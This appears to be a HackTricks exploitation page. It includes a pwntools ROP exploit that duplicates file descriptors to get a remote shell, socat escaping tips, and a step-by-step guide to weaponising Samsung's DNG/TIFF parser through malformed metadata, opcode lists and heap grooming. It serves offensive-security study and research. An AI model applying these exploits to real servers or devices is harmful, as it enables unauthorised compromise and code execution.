# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

When sending an exploit to a remote server that calls **`system('/bin/sh')`** for example, this will be executed in the server process ofc, and `/bin/sh` will expect input from stdin (FD: `0`) and will print the output in stdout and stderr (FDs `1` and `2`). So the attacker won't be able to interact with the shell.

A way to fix this is to suppose that when the server started it created the **FD number `3`** (for listening) and that then, your connection is going to be in the **FD number `4`**. Therefore, it's possible to use the syscall **`dup2`** to duplicate the stdin (FD 0) and the stdout (FD 1) in the FD 4 (the one of the connection of the attacker) so it'll make feasible to contact the shell once it's executed.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```

## Socat & pty

Note that socat already transfers **`stdin`** and **`stdout`** to the socket. However, the `pty` mode **include DELETE characters**. So, if you send a `\x7f` ( `DELETE` -)it will **delete the previous character** of your exploit.

In order to bypass this the **escape character `\x16` must be prepended to any `\x7f` sent.**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## RAW Image Parser Exploitation (DNG/TIFF Metadata & Opcodes)

An in-the-wild Android chain weaponized Samsung's **Quram** DNG/TIFF parser that runs inside the privileged **`com.samsung.ipservice`** service. The attacker only needed the victim to tap a WhatsApp image so it was saved into **`MediaStore`**, after which the Samsung system service automatically ingested the RAW file and executed the exploit.

High-level flow:

1. Craft a TIFF-based DNG payload but give it a harmless WhatsApp-style `.jpg/.jpeg` filename.
2. Deliver it over any channel that stores media inside `MediaStore` (WhatsApp, MMS, cloud sync, etc.).
3. Let OEM background services that scan `MediaStore` open the file with their privileged image stack.
4. Use DNG metadata to steer the parser into fragile code paths and turn opcode processing into a memory-corruption primitive.
5. Drop a ROP chain/shellcode into RAW buffers that will be dereferenced after the corruption.

Quick triage of suspicious samples:

```bash
file "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"
exiftool -OpcodeList1 -OpcodeList2 -OpcodeList3 "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"
```

### Metadata steering & SubIFDs

- Abuse **multiple SubIFDs** (e.g., Preview + two "Main Image" entries sized 16×16 and 1×1) to force alloc/free patterns that rarely occur in normal RAWs.
- Set contradictory geometry such as **`ActiveArea = 0 0 10 10`** for a declared 16×16 tile so that internal loops mis-compute iteration bounds and buffer sizes.
- Mix **strip and tile storage** simultaneously (`TileByteCounts = 256` while `StripByteCounts = 1`) to hit parser logic that assumes only one storage mode is active.
- Keep `SamplesPerPixel = 1` and CFA metadata inconsistent with the stated color layout to influence de-bayering paths that hold function/vtable pointers.

These tricks let you force the decoder to allocate attacker-sized chunks derived only from metadata, which is perfect for heap grooming before the overflow triggers.

### Opcode list based corruption primitives

- DNG **Opcode Lists** are essentially a DSL that the parser executes before demosaicing. Stuffing **thousands of identical `[opcode 23]` entries** makes the library allocate very large descriptor arrays whose bounds often trust `ImageWidth × ImageHeight`.
- Chaining **`TrimBounds` → `DeltaPerColumn`** operations while the image dimensions disagree with the `ActiveArea` induces off-by-one writes when coordinates are recomputed between opcodes.
- Because opcodes execute sequentially, you can first use them to spray controlled data, then trigger the vulnerable opcode that overwrites a nearby pointer with offsets pointing back into your sprayed data.

### Allocator-aware heap grooming

- The campaign shipped **jemalloc and scudo variants**, highlighting that RAW metadata can be tuned to request allocations that match the target allocator's size classes/bins.
- On **scudo**, the exploit keeps allocations inside a single size class to avoid immediate quarantine while still placing the vulnerable opcode buffer next to an object containing function pointers.
- On **jemalloc**, the same concept targets small bin freelists and corrupts chunk metadata to pivot execution.
- Always model the allocator you are targeting: list the sizes that each SubIFD, tile buffer, opcode array, and CFA table will request, and adjust metadata until the victim control structure and your spray buffer sit adjacently.

## References

- [Project Zero: A look at an Android ITW DNG exploit](https://googleprojectzero.blogspot.com/2025/12/a-look-at-android-itw-dng-exploit.html)

{{#include ../banners/hacktricks-training.md}}
